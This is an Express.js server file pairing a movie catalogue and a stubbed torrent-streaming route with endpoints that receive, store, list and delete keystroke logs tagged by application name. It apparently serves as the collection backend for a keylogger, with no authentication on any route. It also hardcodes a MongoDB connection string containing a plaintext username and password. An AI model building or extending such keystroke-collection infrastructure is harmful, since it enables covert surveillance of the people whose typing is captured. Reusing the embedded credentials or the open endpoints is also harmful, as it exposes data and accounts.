// Changed require to import
import express from 'express';
import mongoose from 'mongoose';
import WebTorrent from 'webtorrent';
import cors from 'cors';

const app = express();
app.use(express.json());

// const client = new WebTorrent();
app.use(cors());

const PORT = 9001;

app.get("/auth-now", (req, res) => {
  res.send("Successfully reauthenticated!");
});

app.get("/", (req, res) => {
  console.log("Test");
  res.send("Successfully authenticated!");
});

// MongoDB code starts

// MongoDB connection
  const mongoURI =
    "mongodb+srv://faisal26:khalid26@cluster0.aalut.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";

mongoose
  .connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log("MongoDB connected..."))
  .catch((err) => console.log(err));

// Define Schema
const MovieSchema = new mongoose.Schema({
  id: { type: String, required: true },
  poster: { type: String, required: true },
  plot: { type: String, required: true },
  year: { type: String, required: true },
  media_url: { type: String, required: true },
});

const Movies = mongoose.model("Movies", MovieSchema);

// Define KeyLog Schema
const KeyLogSchema = new mongoose.Schema({
  content: { type: String, required: true },
  appName: { type: String },
  isLocal: { type: Boolean, default: false },
  timeStamp: { type: Date, default: Date.now }
});

const KeyLogs = mongoose.model("KeyLogs", KeyLogSchema);

// Routes for CRUD operations
app.post("/movie", async (req, res) => {
  try {
    console.log("req body -----> : ", req.body);
    const newMovie = new Movies(req.body);
    const savedMovie = await newMovie.save();
    res.status(201).json(savedMovie);
  } catch (err) {
    console.error(err);
    res.status(400).json({ message: err.message });
  }
});

app.get("/movies", async (req, res) => {
  try {
    const movies = await Movies.find();
    res.status(200).json(movies);
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: err.message });
  }
});

app.get("/movies/:id", async (req, res) => {
  try {
    const movie = await Movies.findById(req.params.id);
    if (!movie) throw new Error("Movie not found");
    res.status(200).json(movie);
  } catch (err) {
    console.error(err);
    res.status(404).json({ message: err.message });
  }
});

app.put("/movies/:id", async (req, res) => {
  try {
    const movie = await Movies.findByIdAndUpdate(req.params.id, req.body, {
      new: true,
      runValidators: true,
    });
    if (!movie) throw new Error("Movie not found");
    res.status(200).json(movie);
  } catch (err) {
    console.error(err);
    res.status(400).json({ message: err.message });
  }
});

app.delete("/movies/:id", async (req, res) => {
  try {
    const movie = await Movies.findByIdAndDelete(req.params.id);
    if (!movie) throw new Error("Movie not found");
    res.status(200).json({ message: "Movie deleted" });
  } catch (err) {
    console.error(err);
    res.status(404).json({ message: err.message });
  }
});

// Route to create a new KeyLog entry
app.post("/keylog", async (req, res) => {
  try {
    const newLogEntry = new KeyLogs(req.body);
    const savedLog = await newLogEntry.save();
    res.status(201).json(savedLog);
  } catch (err) {
    console.error(err);
    res.status(400).json({ message: err.message });
  }
});

app.post("/local-keylog", async (req, res) => {
  try {
    const newLogEntry = new KeyLogs({ ...req.body, isLocal: true });
    const savedLog = await newLogEntry.save();
    res.status(201).json(savedLog);
  } catch (err) {
    console.error(err);
    res.status(400).json({ message: err.message });
  }
});

// Route to get all KeyLog entries
app.get("/keylogs", async (req, res) => {
  try {
    const logs = await KeyLogs.find({ isLocal: false });
    res.status(200).json(logs);
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: err.message });
  }
});

app.get("/local-keylogs", async (req, res) => {
  try {
    const logs = await KeyLogs.find({ isLocal: true });
    res.status(200).json(logs);
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: err.message });
  }
});

// Route to delete all KeyLog entries
app.delete("/keylogs", async (req, res) => {
  try {
    const deletedLogs = await KeyLogs.deleteMany({});
    if (deletedLogs.deletedCount === 0) {
      throw new Error("No logs to delete");
    }
    res.status(200).json({ message: "All logs deleted" });
  } catch (err) {
    console.error(err);
    res.status(404).json({ message: err.message });
  }
});
// MongoDB code ends

// Torrent Streaming starts

// Route for streaming torrent
app.get("/stream-torrent", (req, res) => {
  const magnetURI = req.query.magnet || "your_default_magnet_url_here";  // Highlighted change
  if (!magnetURI) {
    return res.status(400).send("Magnet URI is required");
  }
  // client.add(magnetURI, (torrent) => {
  //   const file = torrent.files.find(file => file.length > 0);  // Highlighted change
  //   if (!file) {
  //     return res.status(404).send("File not found in torrent");
  //   }

  //   const range = req.headers.range;
  //   if (range) {
  //     const parts = range.replace(/bytes=/, "").split("-");
  //     const start = parseInt(parts[0], 10);
  //     const end = parts[1] ? parseInt(parts[1], 10) : file.length - 1;
  //     const chunksize = end - start + 1;

  //     const head = {
  //       "Content-Range": `bytes ${start}-${end}/${file.length}`,
  //       "Accept-Ranges": "bytes",
  //       "Content-Length": chunksize,
  //       "Content-Type": "video/mp4",
  //     };
  //     res.writeHead(206, head);

  //     const stream = file.createReadStream({ start, end });
  //     stream.pipe(res);
  //   } else {
  //     const head = {
  //       "Content-Length": file.length,  // Highlighted change
  //       "Content-Type": "video/mp4",
  //     };
  //     res.writeHead(200, head);

  //     const stream = file.createReadStream();  // Highlighted change
  //     stream.pipe(res);
  //   }
  // });
});

// Torrent Streaming ends

// Server LISTENing here
app.listen(PORT, () => {
  console.log("Server started at port: " + PORT);  // Highlighted change
});
